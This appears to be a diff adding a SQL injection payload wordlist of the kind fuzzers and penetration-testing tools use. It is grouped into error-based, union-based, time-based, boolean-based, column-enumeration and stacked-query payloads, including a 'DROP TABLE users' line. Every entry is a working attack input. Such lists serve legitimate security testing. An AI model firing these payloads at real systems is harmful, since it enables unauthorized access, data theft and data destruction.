@@ -1,0 +1,94 @@
+# SQL Injection Payloads
+# Error-based
+'
+''
+"
+""
+`
+')
+")
+`)
+'))
+"))
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+1' OR '1'='1
+1" OR "1"="1
+' OR ''='
+" OR ""="
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR 1=1--
+1 OR 1=1
+1' OR 1=1--
+1" OR 1=1--
+admin'--
+admin'#
+admin'/*
+') OR ('1'='1
+") OR ("1"="1
+') OR ('1'='1'--
+' AND '1'='1
+' AND '1'='2
+1' AND '1'='1
+1' AND '1'='2
+
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT 1,2,3--
+-1' UNION SELECT 1,2,3--
+0' UNION SELECT 1,2,3--
+1' UNION SELECT 1,user(),3--
+1' UNION SELECT 1,@@version,3--
+1' UNION SELECT 1,database(),3--
+
+# Time-based
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND pg_sleep(5)--
+1' AND SLEEP(5)--
+1; WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5)--
+'; SELECT SLEEP(5)--
+1 AND SLEEP(5)
+' AND BENCHMARK(5000000,MD5('test'))--
+1'; WAITFOR DELAY '0:0:5';--
+') AND SLEEP(5) AND ('1'='1
+1) AND SLEEP(5) AND (1=1
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+# Boolean-based
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+1 AND 1=1
+1 AND 1=2
+' OR 1=1--
+' OR 1=2--
+1' AND 1=1 AND '1'='1
+1' AND 1=2 AND '1'='1
+
+# Order by (column enumeration)
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 5--
+' ORDER BY 10--
+' ORDER BY 100--
+1' ORDER BY 1--
+1' ORDER BY 10--
+
+# Stacked queries
+'; DROP TABLE users--
+'; SELECT 1--
+'; INSERT INTO users VALUES('test')--
